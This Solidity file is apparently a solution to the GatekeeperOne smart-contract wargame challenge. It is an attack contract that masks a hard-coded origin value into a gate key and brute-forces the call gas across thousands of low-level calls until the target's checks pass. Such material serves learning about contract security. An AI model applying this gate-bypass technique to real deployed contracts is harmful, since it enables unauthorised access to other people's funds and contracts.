// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract AttackGatekeeperOne {
    GatekeeperOne public gk;

    bytes8 txOrigin16 = bytes8(uint64(uint160(0xC4e9465Ad917BC89DE2E)));
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    function Backdoor (address _target) public {
        gk = GatekeeperOne(_target);
    }

    function enter() public {
        for (uint256 i; i < 8191; i++) {
            (bool result, bytes memory data) = address(gk).call{gas: i + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));

            if (result) {
                break;
            }
        }
    }
}